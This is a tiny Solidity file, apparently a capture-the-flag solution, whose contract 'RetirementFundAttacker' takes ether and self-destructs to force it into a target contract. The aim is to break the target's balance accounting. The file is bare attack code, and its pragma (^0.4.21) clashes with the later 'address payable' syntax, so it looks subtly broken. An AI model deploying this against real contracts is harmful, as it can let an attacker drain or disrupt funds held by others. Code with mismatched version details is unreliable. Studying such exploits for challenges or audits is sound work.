pragma solidity ^0.4.21;

contract RetirementFundAttacker {

    constructor (address payable target) payable {
        require(msg.value > 0);
        selfdestruct(target);
    }
}